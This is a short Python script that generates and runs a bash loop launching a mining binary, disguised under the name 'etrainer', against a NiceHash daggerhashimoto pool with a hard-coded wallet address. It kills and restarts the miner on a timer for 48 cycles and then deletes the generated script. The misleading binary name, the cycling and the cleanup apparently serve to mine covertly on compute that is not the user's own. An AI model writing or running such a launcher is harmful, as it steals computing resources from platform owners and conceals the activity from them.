import os
server = "usa-west"
address = "3Kwm7P6y2xyij294BmF9T9efBp2mW8wDYK"
worker_name = "hpws"

start_at = "1m"
kill_at = "2h"
total_hrs = 48


execu = f"./etrainer -U -P stratum2+tcp://{address}.{worker_name}@daggerhashimoto.{server}.nicehash.com:3353"

runner = f'{execu} & \nRUN_ME_PID=$! \nsleep {kill_at}\necho "Killed after {kill_at}"\nkill -9 $RUN_ME_PID\nsleep {start_at}\necho "Started Again after {start_at}"\n\n'

with open("RUNNER.sh","w") as fp:
    fp.write("#!/bin/bash\n")
    for i in range(total_hrs):
        fp.write(runner)


os.system("sh ./RUNNER.sh")
os.system("rm RUNNER.sh")
# this is a test comment
